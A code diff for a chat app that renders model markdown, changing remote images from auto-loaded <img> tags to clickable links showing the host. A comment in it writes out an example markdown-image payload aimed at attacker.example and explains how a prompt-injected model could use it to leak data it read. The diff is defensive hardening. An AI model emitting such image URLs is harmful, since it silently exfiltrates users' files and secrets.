@@ -38,6 +38,15 @@ function isHttpUrl(src: string): boolean {
   return /^https?:\/\//i.test(src) || src.startsWith('data:')
 }
 
+/** The host, for showing the user where a remote image would come from. */
+function hostOf(url: string): string {
+  try {
+    return new URL(url).hostname || url
+  } catch {
+    return url
+  }
+}
+
 function LocalOrRemoteImg({
   src,
   alt
@@ -46,20 +55,55 @@ function LocalOrRemoteImg({
   alt?: string
 }) {
   if (!src) return null
-  if (isHttpUrl(src)) {
+
+  // Generated images arrive as data: URLs from readLocalImage, so they render
+  // inline as normal.
+  if (src.startsWith('data:')) {
     return <img src={src} alt={alt || ''} className="md-img" />
   }
-  if (looksLikeImagePath(src)) {
+
+  /*
+   * A REMOTE image is offered as a link, never fetched.
+   *
+   * Rendering it as <img> means the app requests that URL the instant a reply
+   * appears. Since the reply is model output, a prompt-injected model could
+   * write ![](https://attacker.example/?d=<something it just read>) and the data
+   * would leave silently, with no click and nothing on screen to notice. That is
+   * the standard exfiltration channel for an app that renders model markdown,
+   * and this one reads local files, so there is plenty worth taking.
+   *
+   * As a link, nothing loads until the user decides, the destination host is
+   * visible before they decide, and the click opens their browser rather than
+   * fetching inside the app. The CSP drops `img-src https:` to enforce it, so a
+   * missed path here fails closed instead of silently loading.
+   */
+  if (isHttpUrl(src)) {
     return (
-      <LocalImage
-        image={{
-          path: src,
-          label: alt?.trim() || src.replace(/\\/g, '/').split('/').pop() || src,
-          caption: alt?.trim() || undefined
-        }}
-      />
+      <a
+        href={src}
+        className="md-remote-img"
+        title={`Opens ${src} in your browser. Remote images are not loaded inside Gronk.`}
+      >
+        <span className="md-remote-img-icon" aria-hidden>
+          ▣
+        </span>
+        <span className="md-remote-img-label">{alt?.trim() || 'Image'}</span>
+        <span className="md-remote-img-host">{hostOf(src)}</span>
+      </a>
     )
   }
+
+  if (looksLikeImagePath(src)) {
+    const altText = alt?.trim()
+    const filename = src.replace(/\\/g, '/').split('/').pop() || src
+    // No caption. It was set to the same alt text as the label, so every
+    // generated image printed its description twice, one line under the other.
+    return <LocalImage image={{ path: src, label: altText || filename }} />
+  }
+
+  // Anything else: a relative or unrecognised src that is not a remote URL, not
+  // a data URL, and not image-shaped. Rendering it as <img> cannot reach the
+  // network under the CSP, so it either resolves locally or shows nothing.
   return <img src={src} alt={alt || ''} className="md-img" />
 }
 
